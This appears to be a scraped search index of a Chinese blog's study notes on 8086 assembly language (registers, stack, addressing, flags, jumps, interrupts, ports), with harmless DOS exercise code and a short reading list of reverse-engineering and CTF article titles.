被调用函数： 堆栈如下： 解决方法1. 在函数外部调整栈顶地址使用add指令，对esp寄存器进行操作 2. 在函数内部添加 ret 8 是把ret和把第一种情况的add两条指令整合成一条指令，在函数内部完成堆栈平衡。","link":"/2022/02/03/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/"},{"title":"一些不错的技术文章（持续更新）","text":"C语言相关 C语言函数调用栈（一）C语言函数调用栈(一) - clover_toeic - 博客园 (cnblogs.com) C语言函数调用栈（二）C语言函数调用栈(二) - clover_toeic - 博客园 (cnblogs.com) 格式化字符串漏洞原理详解格式化字符串漏洞原理详解_ditto的博客-CSDN博客_格式化字符串漏洞 plt表和got表(27条消息) GOT表和PLT表知识详解_qq_18661257的专栏-CSDN博客_got表 工具学习 checksec及其包含的保护机制[讨论]checksec及其包含的保护机制-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com pwntools学习：[原创][新手向] 一步一步学pwntools-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (27条消息) IDA反编译失败总结_寻梦&amp;之璐-CSDN博客 Linux: 浅谈elf中的got和plt(27条消息) 浅析ELF中的GOT与PLT__wells的博客-CSDN博客_got plt 逆向： 利用符号执行去除控制流平坦化 - 博客 - 腾讯安全应急响应中心 (tencent.com) [原创]Python逆向——Pyinstaller逆向-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com IDA出现”sp-analysis failed”和F5(反编译)失败 - 灰信网（软件开发博客聚合） (freesion.com) 密码学： RSA攻击汇总 (qq.com) RSA | Lazzaro (lazzzaro.github.io) 【浅谈系列】高次剩余的求解 - Arpe1s’ Blog 待分类","link":"/2022/02/03/%E4%B8%80%E4%BA%9B%E4%B8%8D%E9%94%99%E7%9A%84%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"},{"title":"汇编语言 11 int指令","text":"第十三章 int指令该章主要讲解int指令引发的中断 13.1 int指令1int n;n为中断类型码，功能是引发中断过程 执行过程： 取中断类型码n 标志寄存器入栈，IF=0，TF=0 CS、IP入栈 (IP)=(N4)，(CS)=(n\\4+2) 从此处转去执行n号中断的中断处理程序 13.2 编写供应用程序调用的中断例程 在中断例程sqr的最后，要使用iret指令，其功能为 123pop IPpop CSpopf 13.3 对int、iret和栈的深入理解13.4 BIOS和DOS所提供的中断例程BIOS（基本输入输出系统），主要包含以下几部分内容： 硬件系统的检测和初始化程序 外部中断和内部中断的中断例程 用于对硬件设备进行I/O操作的中断例程 其他和硬件系统相关的中断例程 操作系统DOS也提供了中断例程，从操作系统的角度来看，DOS的中断例程就是操作系统向程序员提供的编程资源 13.5 BIOS和DOS中断例程的安装过程BIOS和DOS所提供的中断例程如何安装到内存中 13.6 BIOS中断例程应用一般来说，一个供程序员调用的中断例程中往往包括多个子程序，中断例程内部用传递进来的参数来决定执行哪一个子程序。BIOS和DOS提供的中断例程，都用ah来传递内部子程序的编号。 13.7 DOS中断例程应用我们前面一直使用的是int 21h中断例程的4ch号功能，即程序返回功能： 1234567mov ah,4ch ;程序返回mov al,0 ;返回值int 21h;常写为mov ax,4c00hint 21h int 21h中断例程在光标位置显示字符串的功能： 123ds:dx 指向字符串 ;要显示的字符串需要用&quot;$&quot;作为结束符mov ah,9 ;功能号9，表示在光标位置显示字符串int 21h","link":"/2022/04/22/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-11-int%E6%8C%87%E4%BB%A4/"},{"title":"汇编语言(10) 内中断","text":"第十二章 内中断中断：CPU不再接着（刚执行完的指令）向下执行，而是转去处理这个特殊消息 中断信息可以来自CPU的内部和外部，此处主要讨论来自CPU内部的中断信息 12.1 内中断的产生对于8086CPU，当CPU内部有下面的情况发生时，将产生相应的中断信息 除法错误，如执行diiv指令产生的除法溢出 (0) 单步执行 (1) 执行into指令 (4) 执行int指令 (int n) 中断类型码：字节型数据，用于标识中断信息的来源，可表示256种 12.2 中断处理程序如何根据8位的中断类型码得到中断处理程序的段地址和偏移地址？ 12.3 中断向量表中断处理程序的入口地址的列表 CPU如何找到中断向量表对8086PC机，中断向量表指定放在内存地址0处。从内存0000:0000到000:03FF的1024个单元存放着中断向量表。 在中断向量表中，一个表项存放一个中断向量，即一个中断处理程序的入口地址。所以一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。 12.4 中断过程下面是8086CPU在收到中断信息后，所引发的终端过程 （从中断信息中）取得中断类型码 标志寄存器的值入栈 设置标志寄存器的第8位TF和第9位IF的值为0 CS的内容入栈 IP的内容入栈 从内存地址为中断类型码*4 和中断类型码*4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS 12.5 中断处理程序和iret指令 iret指令通常和硬件自动完成的中断过程配合使用，其功能描述如下： 123pop IPpop CSpopf 12.6 除法错误中断的处理0号中断处理程序(除法错误中断)的功能：显示提示信心”Divide overflow”后，返回操作系统 12.7 编程处理0号中断主要要做以下几件事： 编写可以显示”overflow!”的中断处理程序：do0 将do0送入内存0000:0200处 (此处内存一般为空) 将do0的入口地址0000:0200存储在中断向量表0号表项中 程序框架： 1234567891011assume cs:codecode segmentstart: do0安装程序 设置中断向量表 mov ax,4c00h int 21hdo0: 显示字符串&quot;overflow!&quot; mov ax,4c00h int 21hcode endsend start 12.8 安装 12.9 do0 注意：将”overflow!”放到do0程序中，若是将字符串放到主程序的data段，在主程序执行完后由于内存空间被系统回收，使得字符串容易被其他内容覆盖。另外，由于do0程序开始处”overflow!”不是可以执行的代码，所以在”overflow”前加上一条jmp指令，转移到正式的do0程序。 12.10 设置中断向量 12.11 单步中断CPU在执行完一条指令后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程。单步中断的中断类型码为1，它所引发的中断过程如下： 取得中断类型码1 标志寄存器入栈，TF、IF设置为0 CS、IP入栈 (IP)=(14)，(CS)=(1\\4+2) 单步中断为单步跟踪程序的执行过程提供了实现机制 12.12 响应中断的特殊情况有些情况下，CPU在执行完当前指令后，即便是发生中断，也不会响应","link":"/2022/04/06/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-10-%E5%86%85%E4%B8%AD%E6%96%AD/"},{"title":"汇编语言 14 端口","text":"14.1 端口的读写端口地址的的范围：0~65535 端口的读写指令只有两条：in和out 1int al,60h ;从60h号端口读入一个字节 注意，在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口的数据。访问8位端口时用al，访问16位端口时用ax 14.2 CMOS RAM芯片14.3 shl和shr指令shl是逻辑左移指令，它的功能为 将一个寄存器或内存单元中的数据向左移位 将最后移出的一位写入CF中 最低位用0补充 如果移动位数大于1时，必须将移动位数放在cl中 shr是逻辑右移指令，它和shl所进行的操作刚好相反 将一个寄存器或内存单元中的数据向右移位 将最后移出的一位写入CF中 最高位用0补充 如果移动位数大于1时，必须将移动位数放在cl中 14.4 CMOS RAM中存储的时间信息","link":"/2022/04/23/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-12-%E7%AB%AF%E5%8F%A3/"},{"title":"汇编语言(2) 第一个程序","text":"还是只想摸鱼 4.1 一个源程序从写出到执行的过程 编写汇编源程序 对源程序进行编译链接 执行可执行文件中的程序 4.2 源程序12345678910111213assume cs:codesgcodesg segment mov ax,0123H mov bx,0456H add ax,bx add ax,ax mov ax,4c00H int 21Hcodesg endsend 1、伪指令汇编语言源程序中，包含两种指令，一种是汇编指令，一种是伪指令。 伪指令没有对应的机器指令，最终不被CPU执行，而是由编译器执行来进行相关的编译工作。 XXX segment … XXX ends segment和ends是一对成对使用的伪指令，其功能为定义一个段，一个段还必须有一个名称来标识 end end是一个汇编程序的结束标记。编译器在编译汇编程序过程中，若碰到伪指令end，则结束对源程序的编译。 （注意区分end和ends） assume assume假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。 2、程序返回一个程序结束后，需要将CPU的控制权返还给使它运行的程序。 相关指令： 12mov ax,4c00Hint 21H 4.3 编辑源程序4.4 编译通过运行masm编译.asm文件生成.obj文件 4.5 连接运行line.exe，将上一步生成的.obj文件进行连接，生成可执行的.exe文件 连接的作用： Summary DOS系统中.EXE文件中程序的加载过程","link":"/2022/01/28/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-2-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/"},{"title":"汇编语言(4) 包含多个段的程序","text":"好久没学习，一直在摸鱼，罪过罪过 6.1 在代码段中使用数据在程序中直接存放数据时，数据会被转译为指令，此时需要使用”start”和”end start”指明程序执行的入口，如 在编译、连接后，由”end start“指明的程序入口，被转化为一个入口地址，存储在可执行文件的描述信息中。 6.2 在代码段中使用栈6.3 将数据、代码、栈放入不同的段 定义多个段的方法：与此前定义代码段的方法无区别 对段地址的引用：在程序中，段名代表了段地址，因此指令“mov ax,data”的含义就是将名称为data的段的段地址送入ax “代码段”、“数据段”、“栈段”完全是我们的安排 仅是便于阅读，CPU并不知道他们，并不是说将某个段定义为“代码段”CPU就会自动执行它 即使使用以下伪指令将cs、ds和ss分别与code、data、stack段相连，CPU也不会自动将cs指向code，ds指向data，ss指向stack 1assume cs:code,ds:data,ss:stack CPU如何知道程序入口？在源程序的最后用“end start”说明了程序的入口，这个入口将被写入可执行文件的描述信息，可执行文件中的程序被加载入内存后，CPU的CS:IP将被设置指向这个入口。","link":"/2022/02/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-4-%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/"},{"title":"汇编语言(5) 更灵活的定位内存地址的方法","text":"7.1 and 和 or 指令and 指令：逻辑与指令，按位进行与运算例如： 123mov al,01100011Band a1,00111011B;a1=00100011B or 指令：逻辑或指令，按位进行或运算例如： 123mov al,01100011Bor al,00111011B;al=01111011B 7.2 ASCII码略 7.3 以字符形式给出的数据在汇编程序中，可以用‘…’的方式指明数据是以字符的形式给出，编译器将自动将其转化为ASCII码 例如： 1db 'unIX' ;相当于 &quot;db 75H,6EH,49H,58H&quot; 7.4 大小写转换的问题观察大小写字符的规律，发现一个字母不管大小写，只用将其第五位置0，它就必为大写字母，置1则变为小写字母 因此通过or和and指令即可以转换大小写字母 12and al,11011111B ;将第五位置0，转变为大写字母or al,00100000B ;将第五位置1，变为小写字母 7.5 [bx+idata]可用以下方式更灵活的指明一个内存单元 12345mov ax,[bx+200] ;主要; 以下方式也可以mov ax,[200+bx]mov ax,200[bx]mov ax,[bx].200 7.6 用[bx+idata]的方式进行数组的处理 7.7 SI和DIsi和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用 123456789mov bx,[0]mov ax,[bx+123];mov si,0mov ax,[si+123];mov di,0mov ax,[di+123];以上三组指令实现了相同的功能 7.8 [bx+si]和[bx+di]可以使用[bx+si]和[bx+di]的方式来指明一个内存单元，其偏移地址为(bx)+(si)/(di) (即bx中的数值加上si/di中的数值)，如 1mov ax,[bx+si] 该指令也可写成如下格式： 1mov ax,[bx][si] 7.9 [bx+si+idata]和[bx+di+idata]1mov ax,[bx+si+idata] (ax)=((ds)*16+(bx)+(si)+idata)，将偏移地址为bx中的数值+si中的数值+idata的字送入ax 也可写成如下数值 123mov ax,200[bx][si]mov ax,[bx].200[si]mov ax,[bx][si].200 7.10 不同的寻址方式的灵活应用二重循环的处理如以下程序，存在一定的问题： 123456789101112131415mov ax,datasgmov ds,axmov bx,0mov cx,4s0: mov si,0 mov cx,3s: mov al,[bx+si] and al,11011111b mov [bx+si],al inc si loop s add bx,16 loop s0 进行了二重循环，却只用了一个循环计数器，造成在进行内层循环的时候，覆盖了外层循环的循环计数器。 实验六：编程，将datasg段中每个单词的前4个字母改为大写字母 123456789101112131415161718192021222324252627282930313233343536373839404142ASSUME CS:codesg, DS:datasg, SS:stacksgstacksg segment dw 0,0,0,0,0,0,0,0stacksg endsdatasg segment db '1. display ' db '2. brows ' db '3. replace ' db '4. modify 'datasg endscodesg segment start: mov ax,stacksg mov ss,ax mov sp,16 mov ax,datasg mov ds,ax mov cx,4 mov bx,0 mov si,0 s: push cx mov cx,4 mov si,0 s1: mov al,ds:[bx+3+si] and al,11011111B mov ds:[bx+3+si],al inc si loop s1 pop cx add bx,16 loop s mov ax,4c00h int 21hcodesg endsend start","link":"/2022/02/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-5-%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"汇编语言(6) 数据处理的两个基本问题","text":"定义描述性符号：reg和sreg: reg：表示一个寄存器，包括ax、bx、bx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di sreg：表示一个段寄存器，包括ds、ss、cs、es 8.1 bx、si、di和bp 在8086CPU中，只有这四个寄存器可以在“[…]”中进行内存单元的寻址。如 12mov ax,[bp+si] ;正确mov ax,[cx] ;错误 在[…]中，这4个寄存器可以单个出现，或只能以四种组合出现bx和si、bx和di、bp和si、bp和di 1234mov ax,[bx+si]mov ax,[bp+di] ;正确mov ax,[bx+bp]mov ax,[si+di] ;错误 只要在[…]中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中 8.2 机器指令处理的数据在什么地方8.3 汇编语言中数据位置的表达三个概念来表达数据的位置 立即数。在汇编指令中直接给出，执行前在CPU的指令缓冲器中 寄存器。指令要处理的数据在寄存器中。 段地址(SA)和偏移地址(EA)。指令要处理的数据在内存中。 8.4 寻址方式 8.5 指令要处理的数据有多长8086CPU的指令可以处理两种尺寸的数据：byte和word，因此要在机器指令中指明长度。 通过寄存器名指明要处理的数据尺寸。 12mov ax,1 ;指明进行子操作mov al,1 ;指明进行字节操作 在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte 12mov word ptr ds:[0],1;指明访问的内存单元为字单元mov byte ptr ds:[0]:1;指明访问的内存单元为字节单元 其它方法。有些指令默认访问的是字单元还是字节单元。如Push指令只进行字操作。 8.6 寻址方式的综合应用8.7 div指令div是除法指令，使用div做除法时应注意以下问题： 除数：有8位和16位两种，在一个reg或内存单元中 被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位 结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数 利用除法指令计算100001/100：除数100小于255，可以在一个8位寄存器中存放，但由于被除数是32位的，除数应为16位，所以用一个16位寄存器来存放除数100 1234mov dx,1mov ax,86a1h ;(dx)*10000h+(ax)=100001mov bx,100div bx 8.8 伪指令dd前面用db和dw定义字节型数据和字型数据。dd是用来定义dword(double word)型数据的。 8.9 dup与db、dw、dd等数据定义伪指令配合使用，用来进行数据的重复，如： 123db 3 dup (0) ;定义三个字节，它们的值都是0db 3 dup (0,1,2) ;定义了9个字节，它们是0、1、2、0、1、2、0、1、2db 3 dup ('abc','ABC') ;定义了18个字节，它们是'abcABCabcABCabcABC 可见，dup的使用格式如下： 实验七 寻址方式在结构化数据访问中的应用题目：（data段在代码中） code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081assume cs:codesgdata segment db '1975','1976','1977','1978','1979','1980','1981','1982','1983' db '1984','1985','1986','1987','1988','1989','1990','1991','1992' db '1993','1994','1995';4*21=84bytes dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 ;0x10h,0x16h,0x17eh dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5927000;4*21=84bytes dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800data endstable segment db 21 dup ('year summ ne ?? ')table endscodesg segment start: mov ax,data mov ds,ax mov ax,table mov ss,ax;放入年份 mov bx,0 mov si,0 mov cx,21 ;由于存在两重循环，使用dx记录cx的值 mov bp,0 s1: mov dx,cx mov cx,4 s2: mov al,ds:[bp+si] mov ss:[bx+si],al inc si loop s2 add bx,16 add bp,4 mov si,0 mov cx,dx loop s1;放入收入 mov cx,21 mov bx,0 mov di,7 mov si,0 s3: mov ax,ds:[si+86] ;收入 mov ss:[bx+di],ax mov ax,ds:[si-2+86] mov ss:[bx+di-2],ax add bx,16 add si,4 loop s3;放入雇员数 mov cx,21 mov si,0 mov bx,0 s4: mov ax,ds:[si+168] ;雇员数 mov ss:[bx+10],ax add si,2 add bx,16 loop s4;计算人均收入，并将结果存入表中;32位除16位，AX存储除法操作的商 mov cx,21 mov bp,0 s5: mov dx,ss:[bp+7] mov ax,ss:[bp+5] mov bx,ss:[bp+10] div bx mov ss:[bp+13],ax add bp,16 loop s5 mov ax,4c00h int 21hcodesg endsend start （感觉寄存器要不够用了-.-!） 结果截图：","link":"/2022/02/25/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-6-%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/"},{"title":"汇编语言 七 转移指令的原理","text":"9.0 转移指令可以修改IP，或同时修改CS和IP的指令统称为转移指令。概括来讲，转移指令就是可以控制CPU执行内存某处代码的指令 8086CPU的转移行为有以下几类： 只修改IP时，称为段内转移，比如：jmp ax 同时修改CS和IP时，称为段间转移，比如：jmp 1000:0 由对IP的修改范围不同，段内转移分为：短转移和近转移 短转移IP修改范围：-128~127 近转移IP修改范围：-32768~32767 8086CPU转移指令分为以下几类： 无条件转移指令（jmp） 条件转移指令 循环指令（loop） 过程 中断 9.1 操作符offset操作符offset：取得标号的偏移地址，如 9.2 jmp指令jmp为无条件转移指令，可以只修改ip，也可以同时修改cs和ip 9.3 依据位移进行转移的jmp指令段内短转移： 1jmp short 标号 ;转到标号处执行指令 对ip修改范围为-128~127 对应jmp的机器码，可以发现CPU在执行jmp指令的时候并不需要转移的目的地址，包含的是转移的位移，该位移是编译器根据汇编指令的“标号”计算出来的，具体计算方法如图 实际上，“jmp short 标号”的功能为：(IP)=(IP)+8位位移： 8位位移=标号处地址-jmp指令后的第一个字节的地址 short指明此处位移为8位位移 8位位移范围为-128~127，用补码表示 8位位移由编译程序在编译时算出 与“jmp short 标号“相近的指令：”jmp near ptr 标号”，其实现的是段内近转移(-32768~32767) 9.4 转移的目的地址在指令中的jmp指令1jmp far ptr 标号 实现的是段间转移，又称为远转移，far ptr 指明了指令用标号的段地址和偏移地址修改CS和IP 9.5 转移地址在寄存器中的jmp指令指令格式： 1jmp 16位reg ;功能：(IP)=(16位reg) 9.6 转移地址在内存中的jmp指令两种格式： 1jmp word ptr 内存单元地址 ;（段内转移） 功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出，比如 123mov ax,0123Hmov ds:[0],axjmp word ptr ds:[0] 第二种： 1jmp dword ptr 内存单元地址 ;(段间转移) 功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址，如： 12345mov ax,0123hmov ds:[0],axmov word ptr ds:[2],0jmp dword ptr ds:[0];执行后，(CS)=0,(IP)=0123H 9.7 jcxz指令jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码种包含转移的位移，而不是目的地址，对IP修改范围都为-128~127。 指令格式： 1jcxz 标号 ;若(cx)=0，则转移到标号出执行 当(cx)!=0时，什么也不做，程序继续向下执行 9.8 loop指令loop指令为循环指令，所有的循环指令都是短位移，IP修改范围为：-128~127 指令格式：loop 标号((cx)=(cx)-1，如果(cx)!=0，转移到标号处执行) 9.9 根据位移进行转移的意义意义：方便了程序段在内存中的浮动装配 9.10 编译器对转移位移超界的检测如果在源程序中出现了转移范围超界的问题，在编译的时候，编译器将报错 实验九 在缓冲区显示彩色字符1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859assume cs:codesg; 绿色：00000010=02H 绿底红色：00100100=24H 白底蓝色01110001=71H; welcome to masm! len=16; 11-13行：0x6e0~0x780~0x820data segment db 'welcome to masm!'data endscodesg segment start: mov ax,data mov ds,ax mov ax,0b800h mov ss,ax ;显示绿色字符串 mov bx,06e0h mov si,70 mov di,0 mov cx,16 s: mov al,ds:[di] mov ss:[bx+si],al add si,1 mov al,02H mov ss:[bx+si],al add si,1 inc di loop s ;显示绿地红色 mov bx,0780h mov si,70 mov di,0 mov cx,16 s1: mov al,ds:[di] mov ss:[bx+si],al add si,1 mov al,24H mov ss:[bx+si],al add si,1 inc di loop s1 ;显示白底蓝色 mov bx,0820h mov si,70 mov di,0 mov cx,16 s2: mov al,ds:[di] mov ss:[bx+si],al add si,1 mov al,71H mov ss:[bx+si],al add si,1 inc di loop s2 mov ax,4c00h int 21hcodesg endsend start","link":"/2022/03/02/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-7-%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86/"},{"title":"汇编语言(9) 标志寄存器","text":"第十一章 标志寄存器11.0 标志寄存器 8086CPU内部有一种特殊的寄存器，称为标志寄存器（简称为flag），flag寄存器与其他寄存器不一样，其他寄存器用于存放数据，整个寄存器具有一个含义，而flag寄存器按位起作用，每一位用于记录特定的信息。 11.1 ZF标志flag的第6位是ZF，零标志位(Zero Flag?)。它记录相关指令执行后，其结果是否为0，若结果为0，ZF=1；若结果不为0，ZF=0。例如 12mov ax,1sub ax,1 ;ZF=1 大部分运算指令(add、sub…)的执行影响标志寄存器，大部分传送指令(mov、push…)不影响标志寄存器。 11.2 PF标志flag的第2位是PF，奇偶标志位(parity flag)。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。若1的个数为偶数，pf=1，如果为奇数，那么pf=0。例如 123mov al,1add al,10;result=00001011B,pf=0 11.3 SF标志flag的第七位是SF，符号标志位(symbol flag)。它记录相关指令执行后，其结果是否为负。如果结果为负，sf=1；如果非负，sf=0。 SF标志就是CPU对有符号数运算结果的一种记录，它记录数据的正负。在我们将数据当作有符号数来运算时，可以通过它来得知结果的正负。如果我们将数据当作无符号数来运算，SF的值则没有意义，虽然相关指令影响了它的值。 11.4 CF标志flag的第0位是CF，进位标志位(carry flag)。一般情况下，它记录了运算结果的最高有效位向更高位的进位值，或向更高位的借位值。 例如： 123mov al,98Hadd al,al ;执行后 (al)=30H,CF=1,CF记录了从最高有效位到更高位的进位值add al,al ;执行后 (al)=60H,CF=0 11.5 OF标志flag的第11位是OF，溢出标志位(Overflow Flag)。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生了溢出，OF=1；如果没有，OF=0。 CF和OF区别：CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位 123mov al,0F0Hadd al,78H;指令执行后，CF=1,OF=0 11.6 adc指令adc是带进位加法指令，它利用了CF位上记录的进位值 12指令格式：adc 操作对象1, 操作对象2功能：操作对象1=操作对象1+操作对象2+CF 例： 1234mov ax,2mov bx,1sub bx,axadc ax,1 ;执行后，(ax)=4。adc执行时，相当于计算：(ax)+1+CF=2+1+1=4 可以看出，adc指令比add指令多加了一个CF位的值 adc指令的意义：举例：0198H和0183H是如何相加的 可以看出，加法可以分两步进行：①低位相加；②高位相加再加上低位相加产生的进位值 即，下面的指令与add ax,bx等价： 12add al,bladc ah,bh 11.7 sbb指令sbb是带借位减法指令，它利用了CF位上记录的错位值 123指令格式： sbb 操作对象1, 操作对象2功能： 操作对象1=操作对象1-操作对象2-CF比如指令 sbb ax,bx，实现的功能是：(ax)=(ax)-(bx)-CF 11.8 cmp指令cmp是比较指令，其功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。其他相关指令通关识别这些被影响 的标志寄存器位来得知比较结果。 指令格式： 1cmp 操作对象1, 操作对象2 比如：cmp ax,ax，结果为0，但并不在ax中保存，仅影响flag的相关各位。指令执行后：zf=1,pf=1,sf=0,cf=0,of=0 CPU在执行cmp指令的时候，也包含两种含义：进行无符号运算和进行有符号数运算。 cmp操作结果sf=1，不能说明操作对象1&lt;操作对象2： 实际结果与逻辑结果的正负的距离，在于是否发生了溢出，如果没有溢出发生，那么实际结果的正负和逻辑上真正结果的正负一致 因此，在考查sf(得知实际结果的正负)的同时考察of(是否发生溢出)，即可以得知逻辑上真正结果的正负，同时可以直到比较的结果。 11.9 检测比较结果的条件转移指令因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(zf、cf)和根据有符号数的比较结果进行转移的条件转移指令(sf、of、zf) 11.10 DF标志和串传送指令flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。 df=0 每次操作后si、di递增 df=1 每次操作后si、di递减 串传送指令：movsb 功能：相当于以下几步： 1234567((es)*16+(di))=((ds)*16+(si)); 如果df=0则：(si)=(si)+1(di)=(di)+1; 如果df=1则：(si)=(si)-1(di)=(di)-1 可以看出，movsb的功能是将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器df位的值，将si和di递增或递减 当然也可以传送一个字：movsw，此时si和di递增2或递减2 movsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用： 1234rep movsb;等价于s: movsbloop s 可见，rep作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次,ovsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。 由于flag的df位决定着串传送指令执行后，si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使程序员能决定传送的方向 8086CPU提供以下两条指令对df位进行设置： 12cld; 将标志寄存器的df位置0std; 将标志寄存器的df位置1 11.11 pushf 和 popfpushf的功能是将标志寄存器的值压栈，而popf是从栈中弹出数据，送入标志寄存器中。 11.12 标志寄存器在Debug中的表示","link":"/2022/03/31/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-9-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"},{"title":"汇编语言（1）寄存器（内存访问）","text":"最近只想摸鱼 3.1 内存中字的存储 字单元，即存放一个字形数据（16位）的内存单元，有两个地址连续的内存单元组成。 图中字形数据4E20H的低位字节存放在0号单元中，高位字节存放在1号单元中 （在这里复习下大端存储和小段存储：) 大端存储：数据的低位保存在内存中的高地址中，数据的高位保存在内存的低地址中 小端存储：数据的高位保存在内存中的高地址中，数据的低位保存在内存的低地址中 3.2 DS和[address]8086CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址。 比如要读取10000H单元的内容，可用如下程序段进行： 123mov bx,1000Hmov ds,bxmov a1,[0] “[…]”表示一个内存单元，其中的0表示偏移地址。 另：8086CPU不支持直接将数据送入段寄存器，即不能直接：mov ds,1000H。需要一个寄存器进行中继的操作。 3.7 栈在内存中划出一段空间当作栈使用，栈的地址存放在寄存器SS中，寄存器SP则指向栈顶的位置。因此，任意时刻，SS:SP指向栈顶元素。 push指令：1push ax 这段指令的意义为将寄存器ax的值压入栈中，有以下两步完成： pop指令1pop ax 这段指令的意义为将栈顶的值赋给ax，有以下两步完成： 值得注意的是，pop操作后，1000CH处的2266H仍存在，尽管它已不在栈中。当有新的元素Push入栈时，则会在上面覆写新的数据。 栈空的状态 3.8 栈越界8086CPU不保证我们对栈的操作不会越界 3.10 栈段 答案：SP=0。（寄存器SP只能存储16位的数据，因此需要模2^16。假设pop一个元素，SP-=2，SP=FFFEH） 总结：​ 一段内存，是代码段，还是数据存储空间，还是栈空间，取决于寄存器中CS、IP、SS、SP、DS的指向。 ​ CS:IP指向的地方位代码段，SS:SP指向的地方为栈空间，DS存放数据段地址。 附上一段代码，此处说明了一段内存既可以是代码段，可以是数据的存储空间，也可以是栈空间：","link":"/2022/01/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%881%EF%BC%89%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89/"},{"title":"汇编语言（3） [BX]和loop指令","text":"摸鱼才是正义！ 5.0 前置定义[bx]是什么[bx]和[0]类似，表示内存中的偏移地址，不同的是[bx]中的偏移地址存放在bx寄存器中，如下面的指令： 1mov ax,[bx] 表示将一个内存单元的内容送入ax，这个内存单元的长度为2字节，段地址在寄存器ds中，偏移地址在bx中。 loop循环 书中定义的描述性符号：“()”书中使用“()”来表示一个寄存器或一个内存单元中的内容，”()“中的内容可以有3中类型：①寄存器名 ② 段寄存器名 ③ 内存单元的物理地址。比如： (ax)表示ax中的内容、(al)表示al中的内容、(20000H)表示内存20000H单元的内容 约定符号idata表示常量1mov ax,[idata] 可以表示 mov ax,[1]、mov ax,[2]等 5.1 [BX]5.2 LoopCPU执行loop指令时，要进行两步操作： (cx)=(cx)-1 判断cx中的值，不为零则转至标号处执行程序，为零则向下执行 以计算2^12的值为例进行分析 1234567891011assume cs:codecode segment mov ax,2 mov cx,11s: add ax,ax loop s mov ax,4c00h int 21hcode endsend 代码中有一个标号s，实际上它标识了一个地址，该地址处有一条指令： add ax,ax 用cx和loop指令配合实现循环功能的程序框架如下： 1234mov cx,循环次数s: 循环执行的程序段 loop s 5.4 Debug和汇编编译器masm对指令的不同处理对于如下指令，debug和masm有不同的处理： 1mov ax,[0] debug中表示将ds:0的数据送入ax中 masm则将其当作指令 “mov ax,0”处理 那么如何在源程序中将ds:0的内存送入al中？ 